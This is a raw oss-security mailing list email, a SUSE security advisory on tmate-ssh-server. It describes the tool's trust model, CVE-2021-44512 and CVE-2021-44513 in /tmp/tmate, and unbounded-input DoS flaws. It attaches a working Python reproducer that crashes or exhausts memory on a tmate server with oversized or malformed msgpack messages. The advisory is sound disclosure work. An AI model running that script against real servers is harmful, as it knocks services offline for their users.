X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["19281" "Monday" "6" "December" "2021" "16:16:06" "+0100" "Matthias Gerstner" "mgerstner@suse.de" nil "505" "[oss-security] tmate-ssh-server: Local Privilege Escalation Issues and DoS issues (CVE-2021-44512, CVE-2021-44513)" nil nil nil "12" nil nil (number mark "U       mgerstner@su Dec  6  505/19281 " thread-indent "\"[oss-security] tmate-ssh-server: Local Privilege Escalation Issues and DoS issues (CVE-2021-44512, CVE-2021-44513)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] tmate-ssh-server: Local Privilege Escalation Issues and DoS issues (CVE-2021-44512, CVE-2021-44513)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5863 invoked by uid 550); 6 Dec 2021 15:16:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5830 invoked from network); 6 Dec 2021 15:16:18 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1638803767; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=++9rpvGk9XQf9djldHG8JBHKj3UYrconGX1+z19FrdQ=;
	b=j8T8NzNQ0MhHFcHZ6J1+20lW5WmcB0IvZsa/Drkq5ZYQ3DMwCqE/n5Fg9gTIhlgftqiKKv
	8bRFj9om3jjUuHLgqkNdLvt3e/xdSo8Xpzi2wQqdyHC/cOYNK5uH4w1ZTHO4BatZDat+Gl
	PTlxfVZ7X3qM7F2lmPvX0NsoGclwC9U=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1638803767;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=++9rpvGk9XQf9djldHG8JBHKj3UYrconGX1+z19FrdQ=;
	b=dYCUtyPXImFUDTxzCNRCyRwSXHbdQaTSAO2a4koY6F5doERbUOamJaeRMMZgYKqDOKSHIO
	OwpanaUWQsLg04CQ==
Date: Mon, 6 Dec 2021 16:16:06 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Ya4pNtfatmG59Cbj@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="wvS6suKkkFfJEAof"
Content-Disposition: inline
Subject: [oss-security] tmate-ssh-server: Local Privilege Escalation Issues and DoS issues
 (CVE-2021-44512, CVE-2021-44513)

--wvS6suKkkFfJEAof
Content-Type: multipart/mixed; boundary="0lF0hfkxHBER+IW7"
Content-Disposition: inline


--0lF0hfkxHBER+IW7
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello,

this report is about code review results of the tmate terminal sharing
software [1]. Some local privilege escalation and remote denial-of-service
attack vectors have been identified. Skip to section 6) for the concrete
findings. The following sections give a broader overview of the tmate
security design.

[1]: https://tmate.io

1) What is tmate?
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Tmate allows a terminal session to be easily shared over the network using =
the
SSH protocol. Other people can attach themselves to the shared terminal
session either with full access or with read-only access (just viewing what
happens on the terminal).

Tmate consists of two forks of the tmux terminal multiplexer's [2] code bas=
e.
One fork is for the tmate client side [3] (the party that is sharing its
terminal over the network) and one fork is for the tmate server side [4] (t=
he
central party that relays SSH connections). Both forks originate from
the year 2016 and no sync seems to have happened since then. The upstream
author states that he doesn't backport fixes any more due to lack of time.

The tmate client actively connects to the tmate server side using an outgoi=
ng
SSH connection. This SSH session will be kept alive and a tmux terminal
session is established with some additional instructions shown on the screen
on how to attach to the tmux session via the network.

When other people connect to the tmate server using a regular SSH client an=
d a
secret token as username they will be relayed to the tmate client's tmux
session and can fully access or view it (read-only mode).

[2]: https://github.com/tmux/tmux
[3]: https://github.com/tmate-io/tmate.git
[4]: https://github.com/tmate-io/tmate-ssh-server.git

2) Review Scope
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This review was performed for tmate client version 2.4.0. On the server side
the current Git development status of tmate-ssh-server as of commit befd49f4
was used. This is because the last tmate-ssh-server release (version 2.3.0)=
 is
already over two years old, and a larger number of unreleased changes is fo=
und
on the project's master branch by now. Most of the statements and findings =
in
this report should also be true for the 2.3.0 server version release, howev=
er.

This review was focused on the general security architecture of the tmate
protocol and the network faced interfaces.

3) General Cryptographic Security
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D

The tried and tested openssh security model is changed a lot in tmate. In
regular SSH the two parties establish a secure connection (secure against
eavesdropping), then verify each other. Verification means that the client
verifies the fingerprint of the public SSH server host key to make sure it =
is
the correct party it is talking to and no man in the middle is around. Then
the server requires authentication of the client as the requested login user
e.g. via tunneled cleartext password, public key or PAM module authenticati=
on
mechanisms etc.

In tmate we have three parties:

- A: the party that is sharing its terminal using the tmate client.
- B: the central tmate server that manages multiple tmate sessions and is
     typically publicly accessible in some form.
- C: the party that is connecting to a shared terminal using a regular SSH
     client.

The typical communication flow goes like this:

1. The tmate client (A) connects to to the tmate server (B). It verifies the
   server's fingerprint. Server hostname, port and fingerprint are configur=
ed
   via $HOME/.tmate.conf ("tmate-server-host", "tmate-server-port",
   "tmate-server-rsa-fingerprint").
2. The tmate server (B) performs no verification at all, because any tmate
   client is allowed to create a new session on it. It generates a random
   token consisting of 25 alphanumeric characters. This token uniquely
   identifies the new session and is communicated back to the tmate client =
(A).
3. The tmate client (A) displays the random token and the valid SSH URLs to
   attach to the shared terminal session. It is a command line like follows=
 for
   full or read-only access respectively:
   ```
   ssh    T6PAFr59tsrfEWCaUZg8APCAe@some-team-mate-server.org
   ssh ro-4Eu99VBssTnw9Q3LuYQUzcLEy@some-team-mate-server.org
   ```
4. The secret token / command line now needs to be communicated to people
   that want to attach to the terminal. This step is critical, because it
   depends on the person that wants to share the terminal and how it shares=
 the
   token with others.
5. The user (C) wanting to attach to the shared session now needs to connect
   to the tmate server (B) using the correct secret token to get access to =
the
   shared terminal. (C) will verify the fingerprint of (B), but (B) will not
   authenticate (C) beyond the knowledge of the secret token. The tmate ser=
ver
   (B) will now relay data between (A) and (C).

So in contrast to the classical SSH setup the two endpoints (A) and (C) are
never verifying each other in any way, except via the secret token of 25
characters. So the host fingerprint verification and the user authentication
is all condensed into this secret token that needs to be forwarded from (C)=
 to
(A) by some means. Any unintended party that gets hold of the secret token =
can:

- gain full or read-only access to the session shared by (A)
- replace the session shared by (A) by a malicious session and thus trick (=
C)
  (instead of a random token also an explicit fixed token can be used that
  overwrites existing sessions)

Furthermore the tmate-server (B) is a third party in this setup that needs =
to
be fully trusted by both (A) and (C). If (B) is compromised then all securi=
ty
is gone.

To summarize, the security model used in tmate makes it easy for people to
share their terminals over SSH, but this simplicity may come with a false
sense of security, because the mechanisms used in the background are rather
complex and the important step 4 depends fully on how the person sharing its
terminal is treating the secret token.

4) Default Setup of tmate
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

When looking at a default installation of the tmate client (A) then it is v=
ery
simple to share a terminal via the default upstream server "ssh.tmate.io".
This upstream server name and its fingerprint are hard coded in the client =
in
source file "options-table.c". This means trust for the default upstream
server party (B) is builtin, a decision that should be left up to the user =
in
my opinion.

Thus it is enough to just type "tmate" in a shell to immediately share
terminal access with the upstream server and possibly give full control to =
it,
should it be compromised in some form.

I discussed this with the upstream developer and he agreed to make this an
opt-in but he is still considering options to maintain backward-compatibili=
ty
for existing users.

5) Code Quality and Design
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

Getting an overview of the critical code is not all that easy. The SSH logic
(based on libssh) feels crammed into the tmux code base. The dividing line
between original tmux and changed tmate code was difficult to find for me. =
In
some spots `#ifdef TMATE` sections are found, some additional source files =
are
sprinkled in the source directory.

Especially on the tmate-ssh-server side the tmux internals are basically
openly connected to the Internet and this raises the question whether the t=
mux
developers considered untrusted input in these areas very much.

The code paths accessible to unauthenticated users (and for the tmate-ssh
server party (B) all connections are unauthenticated) are pretty broad and
hard to follow during code review.

The network protocol logic which is based on libmsgpackc binary data items
does not enforce maximum string lengths which means that a variety of DoS
attacks are possible against party B.

The one (probably crucial) security measure taken by the tmate server source
code to protect itself is the following:

- each new session is forked from the master process
- each forked session is placed into a "jail" that consists of some separate
  namespaces and a chroot jail that runs as user "nobody" by default

It is time consuming to make sure that there are no major security issues in
this area reachable over the network. Fuzzing might be an approach to check
this more quickly, I did not go further in this direction, though.

If code execution could be achieved in a forked session process on party B)
then "only" a way out of the jail needs to be found to reach the same secur=
ity
scope as all the other tmate sessions running on the same host.

6) Individual Findings
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

These are all issues on the tmate-ssh-server code base running on party B).

a) Local security issues in /tmp/tmate (CVE-2021-44512, CVE-2021-44513)
-----------------------------------------------------------------------

The tmate-ssh-server maintains a world-writable directory in
/tmp/tmate/sessions into which UNIX domain sockets named after the secret
tokens are placed:

```
$ ls -ld /tmp/tmate
drwx-----x 4 tmate users  80  Sep 1 11:04 /tmp/tmate

$ ls -ld /tmp/tmate/sessions
drwx----wx 2 tmate users 120  Sep 1 11:33 /tmp/tmate/sessions/

$ ls -l /tmp/tmate/sessions
srw-rw---- 1 user users    0  Sep 1 11:05 aVMAvcCWupR3DTK7JF2NfxLeS
lrwxrwxrwx 1 user users   25  Sep 1 11:33 ro-4Eu99VBssTnw9Q3LuYQUzcLEy \
                                      -> T6PAFr59tsrfEWCaUZg8APCAe
lrwxrwxrwx 1 user users   25  Sep 1 11:05 ro-XjB7FchbDAjmMmNnXf2wry3bV \
                                      -> aVMAvcCWupR3DTK7JF2NfxLeS
srw-rw---- 1 user users    0  Sep 1 11:33 T6PAFr59tsrfEWCaUZg8APCAe
```

So this is how different sessions are maintained. If a file is a symlink th=
en
it is considered a read-only session, otherwise read-write.

This setup is subject to a race condition (CVE-2021-44513):

- the creation of these directories is unsafe using `mkdir()` and `chmod()`
  system calls in `main()` found in source file "tmate-main.c". The code
  potentially reuses existing directories that belong to other users. Only =
the
  following `chmod()`s would fail if the owner does not match. This is a ra=
ce
  condition, however, that could be won by using symlinks. In this case a
  local attacker could gain full control over this directory structure and =
thus
  create additional malicious sessions or get control of existing, legit
  sessions.

This setup uses too broad permissions in /tmp/tmate and /tmp/tmate/sessions
(CVE-2021-44512):

- since /tmp/tmate/sessions is world-writable a local malicious user can
  create arbitrary new files in there. For example a UNIX domain socket that
  reaches an attacker controlled local process instead of an actual tmate
  server session.
- although /tmp/tmate/sessions only allows 'wx' for other users this still
  allows to execute a `readlink()` system call on existing symbolic links in
  the directory. Thus a local compromised user that has knowledge of the
  secret token for a read-only session can find out the token for the
  read-write session and get full access.


Both problems are addressed by upstream commit 1c020d1f [5]. I recommended =
to
the upstream author to perform the ownership check first and only then perf=
orm
the `chmod()` calls, but this change did not happen yet.

[5]: https://github.com/tmate-io/tmate-ssh-server/commit/1c020d1f5ca462f5b1=
50b46a027aaa1bbe3c9596

b) Denial-of-Service Attack Vectors
-----------------------------------

- there is no limit to the number of sessions that can be created on the tm=
ate
  ssh server. A simple `ssh someone@my-tmate-server -s tmate -p $tmate_port`
  is enough to establish a new session, get a new session token in
  /tmp/tmate/sessions and a forked session process. This can be done a lot =
of
  times in parallel to consume resources on the host.
- by sending overlong `HEADER` cilent identification, or overly big window
  dimensions via the `SYNC_LAYOUT` message memory exhaustion can be trigger=
ed
  on the host. This will usually "only" kill the forked session process but
  could also negatively impact availibility of the service to other session=
s.
  Practically all string parameters in the network protocol have no size
  limit, I only outlined two prominent cases.
- I managed to cause a NULL pointer dereference by sending a bad `SYNC_LAYO=
UT`
  message, but triggering it is subject to a race condition for some reason.

### Reproducers

Attached is a simple Python script that allows to trigger some of the DoS
issues:

```
# this will not lead to an immediate OOM but shows the principle of sending
# overly long headers
$ tmate_dos.py --send-long-header

# this should lead to an immediate OOM by specifying overly large pane
# parameters
$ tmate_dos.py --allocate-gigantic-pane

# this often leads to a NULL pointer dereference (not fully reliable for
# some reason)
$ tmate_dos.py --send-bad-pane-id
```

### Fixes

Some of these aspects have been addressed by upstream commits [6], [7], [8].

The upstream author expressed that things like a limit on the number of
sessions should be covered by using cgroup limits or similar operating syst=
em
features. No such setup is available upstream yet though.

[6]: https://github.com/tmate-io/tmate-ssh-server/commit/36f073b4ccf05da2fd=
51cc10a2debb443c592c50
[7]: https://github.com/tmate-io/tmate-ssh-server/commit/b41672b634af4ec879=
7449e78e4b731e24e26e16
[8]: https://github.com/tmate-io/tmate-ssh-server/commit/1f314123df2bb29cb0=
7427ed8663a81c8d9034fd

c) Miscellaneous Bits
---------------------

- the tmate-server only seems to support two SSH host key types "rsa" and
  "ed25519" and thus restricts the available cryptographic algorithms (for
  example no ECDSA).
- the handling of random data via `random_stream_init()` and
  `random_stream_get()` is a bit peculiar. It caches up to 256 bytes of ran=
dom
  data in the process that could in theory be shared with child processes a=
nd
  thus multiple processes could use the same random data. Luckily the only =
client
  code currently *always* calls `random_stream_init()` and thus effectively=
 no
  cached random data is ever used.
- file descriptors are not opened with `O_CLOEXEC` flag by default but are =
only
  later explicitly closed via `close_fds_except()`. Since there is no
  `execve()` taking place this is necessary, but having `O_CLOEXEC` to avoid
  accidental future inheritance to unrelated programs would be sensible, to=
o.

7) Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2021-09-03: I reported the findings to the upstream author offering a maxim=
um
            of 90 days coordinated disclosure.

2021-10-17: The upstream author published the fixes that are also referenced
            in this report. I tried to establish a clear publication date f=
or
            the issues but did not get a clear answer.

2021-11-29: I remembered the upstream author about the maximum 90 days
            non-disclosure time approaching. I failed to get any concrete
            information on release plans or finalization of some aspects of
            the fixes.

2021-11-30: I requested CVEs from Mitre for the most pressing issues found =
in
            the report.

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
Phone: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev

--0lF0hfkxHBER+IW7
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="tmate_dos.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3

import argparse
import random
import subprocess
from enum import IntEnum

import msgpack

parser =3D argparse.ArgumentParser()
parser.add_argument("server", help=3D"hostname of tmate-ssh-server")
parser.add_argument("port", help=3D"port number of tmate-ssh-server", type=
=3Dint)
parser.add_argument("--send-long-header", action=3D'store_true')
parser.add_argument("--allocate-gigantic-pane", action=3D'store_true')
parser.add_argument("--send-bad-pane-id", action=3D'store_true')

args =3D parser.parse_args()

ssh =3D subprocess.Popen(
    ["ssh", args.server, f"-p{args.port}", "-s", "tmate"],
    stdin=3Dsubprocess.PIPE
)

pipe =3D ssh.stdin

Command =3D IntEnum(
    'Command',
    [
        "HEADER", "SYNC_LAYOUT", "PTY_DATA", "EXEC_CMD_STR", "FAILED_CMD",
        "STATUS", "SYNC_COPY_MODE", "WRITE_COPY_MODE", "FIN", "READY",
        "RECONNECT", "SNAPSHOT", "EXEC_CMD", "UNAME"
    ],
    start=3D0
)


def sendmsg(args):
    msg =3D msgpack.packb(args, use_bin_type=3DTrue)
    pipe.write(msg)
    pipe.flush()


if args.send_long_header:
    sendmsg([Command.HEADER, 500, "funny_version" * 10240000])
else:
    sendmsg([Command.HEADER, 500, "funny_version"])

# large uname info is also possible
#sendmsg([Command.UNAME, "my system" * 1000, "my node" * 1000, "my release"=
 * 1000, "my version" * 1000, "my machine" * 1000])

# this causes a nice OOM without us even having to allocate memory
if args.allocate_gigantic_pane:
    sendmsg([Command.SYNC_LAYOUT, 10000, 10000, [[1, "funpane", [[1, 100000=
000, 100000000, 0, 0]], 1]], 1])

# this causes a SIGSEGV by attempting to dereference a null pointer, becaus=
e the active window pane ID is not existing
if args.send_bad_pane_id:
    sendmsg([Command.SYNC_LAYOUT, 10000, 10000, [[1, "funpane", [[1, 10000,=
 10000, 0, 0]], 0]], 0])
#sendmsg([Command.SYNC_LAYOUT, 10000, 10000, [[1, "funpane", [[1, 1024, 102=
4, 0, 0]], 1]], 1])

sendmsg([Command.READY])

# testing PTY data loop
#while True:
#    sendmsg([Command.SYNC_LAYOUT, 10000, 10000, [[1, "funpane", [[1, rando=
m.randint(0, 1024), random.randint(0, 1024), 0, 0]], 1]], 1])
#    sendmsg([Command.PTY_DATA, 1, "fun stuff\n"])

pipe.close()
ssh.wait()

--0lF0hfkxHBER+IW7--

--wvS6suKkkFfJEAof
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmGuKTYACgkQFMQFyXGS
NVOECQ/8CU1VmwR617f+2jfQCgEThxBRy8AdI2L8ZY5QRbhj+oUBTY1gk3CQMl9O
Vee1RVrK3DjQZC9wBb97iGicqCLpdJxiYhM8eycIG30cdBVJRs+/V4a4+mN5IeyN
7Ni2PGJHTe3i0ds5YUUvyAeIXEHJjBSAX73hG/9xtR8nYuoVi3aFjqRzf4BuseK2
L2tCfPdyBOZCkGunY63X5FPGGLmqPc93Pl+V5WJS7g181AcYUwFLcMKndt2+7TKG
Dbho4k2JNd/WoL6gtHyauFfnzjV7hYWPJauwY4vD6cpsPZh/EueBZZMf9sRvXjKF
9W2+f2U0Q+setULmgTJFmotDxravsIskf8IilzntnYA+dtiTUKpgcMkYL1pQ5SnA
x72qmJmqBGuxULsM8OlO3wdgdX4Fy6Eo/erBIHJGsucuoieNHs9BoJTug/kINfsf
NsGLb3TLDvFFXiUB5bST+9T1NQ7e4/ym+lxF6Lq/HSJ+BpLrIsdxIlRV4Ukk3tMB
tKosk3G/pBeIXQpN04WE1Z8PmuwBl1Msirg9Jsw/TDvqfACzQ4Q/yPblIoNz7DF2
KHVmujzvWFE+zPKfmMoQsAWJ9qRb5OcPEurVAZiDHxqf71+ygxTMvlo7RMgqjEjj
9vxV9G6SqOJp08oeFZQIM5ux1EP2C4omxBcbzIwfXfPMomvNOjI=
=EDGf
-----END PGP SIGNATURE-----

--wvS6suKkkFfJEAof--
